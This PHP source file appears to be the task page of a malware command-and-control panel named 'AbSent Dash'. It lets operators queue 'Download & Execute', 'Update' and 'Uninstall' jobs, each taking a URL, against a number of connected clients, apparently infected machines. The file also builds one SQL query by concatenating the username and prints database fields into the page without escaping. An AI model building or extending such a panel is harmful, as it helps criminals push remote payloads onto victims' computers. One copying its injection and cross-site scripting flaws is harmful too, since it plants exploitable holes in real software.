<?php
include '../include/session.php';
include '../include/geo.php';
include '../include/stats.php';
$userperms = $odb->query("SELECT permissions FROM users WHERE username = '".$username."'")->fetchColumn(0);
?>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>AbSent Dash</title>
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- inject:css -->
    <link rel="stylesheet" href="../css/lib/getmdl-select.min.css">
    <link rel="stylesheet" href="../css/lib/nv.d3.css">
    <link rel="stylesheet" href="../css/application.css">
    <!-- endinject -->
</head>
<body>
<div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header is-small-screen">
    <header class="mdl-layout__header">
        <div class="mdl-layout__header-row">
            <div class="mdl-layout-spacer"></div>

            <div class="avatar-dropdown" id="icon">
            <span><?php echo $username; ?></span>
                <img src="../images/avatar.png">
            </div>

            <!-- Account dropdawn-->
            <ul class="mdl-menu mdl-list mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect mdl-shadow--2dp account-dropdown"
                for="icon">
                <li class="mdl-list__item mdl-list__item--two-line">
                    <span class="mdl-list__item-primary-content">
                    <span><?php echo $username; ?></span>
                    <span class="mdl-list__item-sub-title"><?php echo $userperms; ?></span>
                    </span>
                </li>
                <li class="list__item--border-top"></li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="account.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">account_circle</i>
                        My account
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="settings.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">settings</i>
                       Settings
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="logout.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">exit_to_app</i>
                        Logout
                    </a>
                </li>
                
        </div>
    </header>

    <div class="mdl-layout__drawer">
        <header>AbSent</header>
        <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="index.php">
                <i class="material-icons" role="presentation">dashboard</i>
                Dashboard
            </a>
            <a class="mdl-navigation__link" href="clients.php">
                <i class="material-icons" role="presentation">person</i>
                Clients
            </a>
            <a class="mdl-navigation__link mdl-navigation__link--current" href="tasks.php">
                <i class="material-icons" role="presentation">map</i>
                Tasks
            </a>
        </nav>
    </div>
    <main class="mdl-layout__content">
        <div class="mdl-grid">
        <?php
                if (isset($_POST['executeTask']))
                {
                    /*
                        *task
                        *parameter1
                        *filter
                        *executions
                    */
                    $task = $_POST['task'];
                    $parameter1 = $_POST['parameter1'];
                    $executions = $_POST['executions'];
                    if ($parameter1 == "" || $parameter1 == NULL)
                    {
                        if($task == "Download & Execute" || $task == "Update")
                        {
                            echo "<div class=\"mdl-cell mdl-cell--3-col mdl-cell--4-offset\">
                                <div class=\"mdl-card mdl-shadow--2dp\">
                                    <div class=\"mdl-card__title\">
                                        <h2 class=\"mdl-card__title-text\"style=\"color:red\">Error!</h2>
                                    </div>
                                    <div class=\"mdl-card__supporting-text\">
                                        <div class=\"\">
                                            Paramerters Needed For This Task.
                                        </div>
                                    </div>
                                </div>
                            </div><meta http-equiv=\"refresh\" content=\"2\">";
                            die();
                        }
                        $parameter1 = "None";
                    }
                    $filter = $_POST['filter'];
                    if ($filter == "" || $filter == NULL)
                    {
                        $filter = "None";
                    }
                    if ($task == "Update" || $task == "Uninstall")
                    {
                        if ($userperms != "admin")
                        {
                            echo "<div class=\"mdl-cell mdl-cell--3-col mdl-cell--4-offset\">
                                <div class=\"mdl-card mdl-shadow--2dp\">
                                    <div class=\"mdl-card__title\">
                                        <h2 class=\"mdl-card__title-text\"style=\"color:red\">Error!</h2>
                                    </div>
                                    <div class=\"mdl-card__supporting-text\">
                                        <div class=\"\">
                                            You Do Not Have Permission to Execute This Command.
                                        </div>
                                    </div>
                                </div>
                            </div><meta http-equiv=\"refresh\" content=\"2\">";
                            die();
                        }
                    }
                    //id	taskId	task	parameters	filters	author	status	date	compleated	failed
                    $i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :taskID, :task, :parameter1, :filters, :author, '1', UNIX_TIMESTAMP(), :total, '0', '0')");
                    $i->execute(array( ":taskID" => gen_uuid(), ":task" => $task, ":parameter1" => $parameter1, ":filters" => $filter, ":author" => $username, ":total" => $executions ));
                    echo "<div class=\"mdl-cell mdl-cell--3-col mdl-cell--4-offset\">
                        <div class=\"mdl-card mdl-shadow--2dp\">
                            <div class=\"mdl-card__title\">
                                <h2 class=\"mdl-card__title-text\"style=\"color:green\">Success!</h2>
                            </div>
                            <div class=\"mdl-card__supporting-text\">
                                <div class=\"\">
                                    Executing Command...
                                </div>
                            </div>
                        </div>
                    </div><meta http-equiv=\"refresh\" content=\"2\">";
                }
            ?>
            <div class="mdl-cell mdl-cell--12-col">
                <div class="mdl-card mdl-shadow--2dp">
                    <div class="mdl-card__title">
                        <h2 class="mdl-card__title-text">Executing Tasks</h2>
                    </div>
                    <div class="mdl-card__supporting-text">
                        <div class="">

                        <table class="mdl-data-table mdl-js-data-table full-width">
                            <thead>
                                <tr>
                                    <th class="mdl-data-table__cell--non-numeric">#</th>
                                    <th class="mdl-data-table__cell--non-numeric">Task ID</th>
                                    <th class="mdl-data-table__cell--non-numeric">Task</th>
                                    <th class="mdl-data-table__cell--non-numeric">Filters</th>
                                    <th class="mdl-data-table__cell--non-numeric">Author</th>
                                    <th class="mdl-data-table__cell--non-numeric">Status</th>
                                    <th class="mdl-data-table__cell--non-numeric">Created</th>
                                    <th class="mdl-data-table__cell--non-numeric">Executions</th>
                                </tr>
                            </thead>
                            <tbody>
                            <?php
                                $tasks = $odb->query("SELECT * FROM tasks");
                                while ($t = $tasks->fetch(PDO::FETCH_ASSOC))
                                {
                                    if ($t['status'] == 2) {$status = 'Completed';}
                                    elseif ($t['status'] == 1) {$status = 'Running';}
                                    elseif ($t['status'] == 3) {$status = 'Paused';}
                                    echo '
                                        <tr class="mdl-data-table__cell--non-numeric">
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['id'].'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['taskId'].'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['task'].'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['filters'].'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['author'].'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$status.'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.timeAgo($t['date']).'</td>
                                        <td class="mdl-data-table__cell--non-numeric">'.$t['compleated'].'/'.$t['failed'].'/'.$t['total'].'</td>
                                    ';
                                }
                            ?>
                            </tbody>
                        </table>

                        </div>
                    </div>
                </div>
            </div>
            <div class="mdl-cell mdl-cell--6-col mdl-cell--3-offset">
                <div class="mdl-card mdl-shadow--2dp">
                    <div class="mdl-card__title">
                        <h2 class="mdl-card__title-text">New Task</h2>
                        <div class="mdl-layout-spacer"></div>
                        <h2 class="mdl-card__title-text">Task Help&nbsp&nbsp</h2>
                    </div>
                    <div class="mdl-card__supporting-text">
                        <div style="width: 50%; float:left">
                            <form method="post">
                                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label getmdl-select full-size" style="width: 80%">
                                    <input class="mdl-textfield__input" type="text" id="task" name="task" readonly tabIndex="-1"/>
                                    <label class="mdl-textfield__label" for="task">Task</label>
                                    <ul class="mdl-menu mdl-menu--bottom-left mdl-js-menu dark_dropdown" for="task">
                                        <li class="mdl-menu__item" >Download & Execute</li>
                                        <li class="mdl-menu__item" >Update</li>
                                        <li class="mdl-menu__item" >Uninstall</li>
                                    </ul>
                                    <label for="task"><i class="mdl-icon-toggle__label material-icons">arrow_drop_down</i></label>
                                </div>
                                <br>
                                <div id="parm">
                                    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 80%">
                                        <input class="mdl-textfield__input" type="text" name="parameter1">
                                        <label class="mdl-textfield__label" for="parameter1">Parameter</label>
                                    </div>
                                    <!--
                                    <button type="button" onclick="addInput()" class="mdl-button mdl-js-button mdl-button--fab mdl-button--mini-fab color--light-blue">
                                        <i class="material-icons">add</i>
                                    </button>&nbsp&nbsp
                                    <button type="button" onclick="removeInput()" class="mdl-button mdl-js-button mdl-button--fab mdl-button--mini-fab color--light-blue">
                                        <i class="material-icons">remove</i>
                                    </button>
                                    <script>
                                        var countBox =2;
                                        var boxName = 0;
                                        function addInput()
                                        {
                                            var boxName="Parameter"+countBox; 
                                            document.getElementById('parm').innerHTML+='<div id="'+countBox+'"><br/><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label full-size" style="width: 80%"><input class="mdl-textfield__input" type="text" name="'+boxName+'"><label class="mdl-textfield__label" for="'+boxName+'">'+boxName+'</label></div><br/></div>';
                                            countBox += 1;
                                        }
                                        function removeInput()
                                        {
                                            var elem = document.getElementById(countBox-1);
                                            elem.parentNode.removeChild(elem);
                                            countBox -= 1;
                                        }
                                    </script>
                                    -->
                                </div>
                                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label full-size" style="width: 80%">
                                        <input class="mdl-textfield__input" type="text" name="filter">
                                        <label class="mdl-textfield__label" for="filter">Filter</label>
                                </div>
                                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label full-size" style="width: 80%">
                                  <!-- input pattern attribute -->
                                    <input class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" name="executions" />
                                    <!-- mdl-textfield__label -->
                                    <label class="mdl-textfield__label" for="executions"># Executions</label>
                                    <!-- class "mdl-textfield__error" -->
                                    <span class="mdl-textfield__error">Input is not a number</span>
                                </div>
                                <div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone submit-cell" align="right">
                                <button type="submit" name="executeTask" class="mdl-button mdl-js-button mdl-button--raised color--light-blue">Execute</button>
                                </div>
                            </form>
                        </div>
                        <div style="width: 50%; float:right">
                            <ul>
                                <li>
                                    <h6>Download & Execute</h6>
                                    <p>
                                        Parameter: Url
                                    </p>
                                </li>
                                <li>
                                    <h6>Update</h6>
                                    <p>
                                        Parameter: Url
                                    </p>
                                </li>
                                <li>
                                    <h6>Uninstall</h6>
                                    <p>
                                     Parameter: None
                                    </p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </main>
</div>

<!-- inject:js -->
<script src="../js/d3.js"></script>
<script src="../js/getmdl-select.min.js"></script>
<script src="../js/material.js"></script>
<script src="../js/nv.d3.js"></script>
<!-- endinject -->

</body>
</html>
